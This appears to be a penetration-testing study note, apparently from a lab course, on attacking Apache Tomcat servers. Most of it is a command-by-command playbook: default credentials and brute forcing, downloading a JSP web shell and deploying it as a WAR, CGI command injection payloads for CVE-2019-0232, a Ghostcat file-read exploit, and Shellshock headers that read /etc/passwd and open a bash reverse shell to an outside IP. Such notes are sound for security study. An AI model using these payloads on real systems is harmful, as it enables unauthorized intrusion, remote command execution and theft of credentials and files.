---
aliases:
tags:
  - cgi
source:
  - https://tomcat.apache.org/
desc:
---
- is an open-source web server that hosts applications written in Java. Tomcat was initially designed to run Java Servlets and Java Server Pages (JSP) scripts. However, its popularity increased in Java-based frameworks and is now widely used by frameworks such as Spring and tools such as Gradle.
- general folder structure
```
├── bin
├── conf
│   ├── catalina.policy
│   ├── catalina.properties
│   ├── context.xml
│   ├── tomcat-users.xml
│   ├── tomcat-users.xsd
│   └── web.xml
├── lib
├── logs
├── temp
├── webapps
│   ├── manager
│   │   ├── images
│   │   ├── META-INF
│   │   └── WEB-INF
|   |       └── web.xml
│   └── ROOT
│       └── WEB-INF
└── work
    └── Catalina
        └── localhost
  ```
  - `/bin` folder stores scripts and binaries needed to start and run a Tomcat server
  - `/conf` folder stores various configuration files used by Tomcat
	  - `/conf/tomcat-users.xml` file stores user credentials and their assigned roles
	    ```xml
	    <?xml version="1.0" encoding="UTF-8"?>

<SNIP>
  
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
<!--
  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary.

  Built-in Tomcat manager roles:
    - manager-gui    - allows access to the HTML GUI and the status pages
    - manager-script - allows access to the HTTP API and the status pages
    - manager-jmx    - allows access to the JMX proxy and the status pages
    - manager-status - allows access to the status pages only

  The users below are wrapped in a comment and are therefore ignored. If you
  wish to configure one or more of these users for use with the manager web
  application, do not forget to remove the <!.. ..> that surrounds them. You
  will also need to set the passwords to something appropriate.
-->

   
 <SNIP>
  
!-- user manager can access only manager section -->
<role rolename="manager-gui" />
<user username="tomcat" password="tomcat" roles="manager-gui" />

<!-- user admin can access manager and admin section both -->
<role rolename="admin-gui" />
<user username="admin" password="admin" roles="manager-gui,admin-gui" />


</tomcat-users>

	    ```
  - `/lib` folder holds the various JAR files needed for the correct functioning of Tomcat
  - `/logs` and `/temp` folders store temporary log files
  - `/webapps` folder is the default webroot of Tomcat and hosts all the applications
- `/webapps/customapp` is expected to have a structure like this
	```sh
/webapps/customapp
├── images
├── index.jsp
├── META-INF
│   └── context.xml
├── status.xsd
└── WEB-INF
    ├── jsp
    |   └── admin.jsp
    └── web.xml
    └── lib
    |    └── jdbc_drivers.jar
    └── classes
        └── AdminServlet.class   
	``` 
	- `/webapps/customapp/WEB-INF/web.xml` nown as the deployment descriptor, this file stores information about the routes used by the application and the classes handling these routes
	- `/webapps/customapp/WEB-INF/classes/` contains all compiled classes. May contain business logic as well as sensitive information. Any vulnerability here can lead to total compromise of site
	- `/webapps/customapp/WEB-INF/lib` stores all the libraries required for the application
	- `/webapps/customapp/WEB-INF/jsp/` contains all the .jsp pages (no longer called javaserver pages, now jakarta server pages)
	- 
	
# discovery

- 404 page can contain server and version
	- `http://app-dev.inlanefreight.local:8080/invalid`
- check docs page
	- `curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat`


# enumerate

- default credentials
	- `tomcat:tomcat`
	- `admin:admin`
- [[gobuster]]
	- `gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt`


# attack

- brute force
	- metasploit
		- [auxiliary/scanner/http/tomcat_mgr_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/tomcat_mgr_login/)
	- python3
		- [[TomcatManagerLoginCredsBruteforce]]
- Tomcat Manager - web application archive (WAR)
	-  `/manager/html` which only users assigned the `manager-gui` role are allowed to access
	- get jsp web shell
		- `curl https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp -o cmd.jsp`
	- zip up
		- `zip -r backup.war cmd.jsp`
	- Upload via the application manager
	  ![[war_deployed.png]]
	- execute
		- `curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id`
	- To cleanup
		- makes sure you `Undeploy`
- tomcat cgi
	- A CGI Servlet is a program that runs on a web server, such as Apache2, to support the execution of external applications that conform to the CGI specification. It is a middleware between web servers and external information resources like databases.
	- The CGI Servlet is a vital component of Apache Tomcat that enables web servers to communicate with external applications beyond the Tomcat JVM. These external applications are typically CGI scripts written in languages like Perl, Python, or Bash. The CGI Servlet receives requests from web browsers and forwards them to CGI scripts for processing. 
	- [CVE-2019-0232](https://nvd.nist.gov/vuln/detail/cve-2019-0232) is a critical security issue that could result in remote code execution. This vulnerability affects Windows systems that have the `enableCmdLineArguments` feature enabled. An attacker can exploit this vulnerability by exploiting a command injection flaw resulting from a Tomcat CGI Servlet input validation error, thus allowing them to execute arbitrary commands on the affected system. Versions `9.0.0.M1` to `9.0.17`, `8.5.0` to `8.5.39`, and `7.0.0` to `7.0.93` of Tomcat are affected.
		- if true `enableCmdLineArguments` setting for Apache Tomcat's CGI Servlet controls whether command line arguments are created from the query string
		- when `enableCmdLineArguments` is enabled on Windows systems because the CGI Servlet fails to properly validate the input from the web browser before passing it to the CGI script. 
		- For instance, an attacker can append `dir` to a valid command using `&` as a separator to execute `dir` on a Windows system. If the attacker controls the input to a CGI script that uses this command, they can inject their own commands after `&` to execute any command on the server. An example of this is `http://example.com/cgi-bin/hello.bat?&dir`, which passes `&dir` as an argument to `hello.bat` and executes `dir` on the server
		- search for cgi scripts
			- cmd files `ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd`
			- bat files `ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat`
				  `welcome                 [Status: 200, Size: 81, Words: 14, Lines: 2, Duration: 371ms]`
			- once a cgi file is found eg. `http://10.129.204.227:8080/cgi/welcome.bat`
				- try diff codes against
					- `http://10.129.204.227:8080/cgi/welcome.bat?&dir`
					- `http://10.129.204.227:8080/cgi/welcome.bat?&set` look for environment variables
					- `http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe` try full paths
					- `http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe` try url encoding


# exploits

## CVE-2020-1938 : Ghostcat

- Tomcat was found to be vulnerable to an unauthenticated LFI in a semi-recent discovery named [Ghostcat](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938). All Tomcat versions before 9.0.31, 8.5.51, and 7.0.100 were found vulnerable. This vulnerability was caused by a misconfiguration in the AJP protocol used by Tomcat. AJP stands for Apache Jserv Protocol, which is a binary protocol used to proxy requests. This is typically used in proxying requests to application servers behind the front-end web servers.
- check for ports 8009 and 8080
	- `nmap -sV -p 8009,8080 app-dev.inlanefreight.local`
- [tomcat-ajp-lfi](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi)
	- The exploit can only read files and folders within the web apps folder, which means that files like `/etc/passwd` can’t be accessed
	- `curl https://raw.githubusercontent.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/refs/heads/master/CNVD-2020-10487-Tomcat-Ajp-lfi.py -o CNVD-2020-10487-Tomcat-Ajp-lfi.py`
	- usage
		- `python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml`


## CVE-2014-6271: Shellshock 

- shellshock vulnerability ([CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271))
- The Shellshock vulnerability allows an attacker to exploit old versions of Bash that save environment variables incorrectly. Typically when saving a function as a variable, the shell function will stop where it is defined to end by the creator. Vulnerable versions of Bash will allow an attacker to execute operating system commands that are included after a function stored inside an environment variable.
	- ` env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"`
	- When the above variable is assigned, Bash will interpret the `y='() { :;};'` portion as a function definition for a variable `y`. The function does nothing but returns an exit code `0`, but when it is imported, it will execute the command `echo vulnerable-shellshock` if the version of Bash is vulnerable. This (or any other command, such as a reverse shell one-liner) will be run in the context of the web server user.
- hunt for cgi first
	- `gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi`
- curl it
	- `curl -i http://10.129.204.231/cgi-bin/access.cgi`
- check for vulnerablity, see if you can get the contents of /etc/passwd
	- `curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi`
- reverse shell
	- `nc -nlvp 7777`
	- `curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi`
- remediate
	- https://www.digitalocean.com/community/tutorials/how-to-protect-your-server-against-the-shellshock-bash-vulnerability
	- 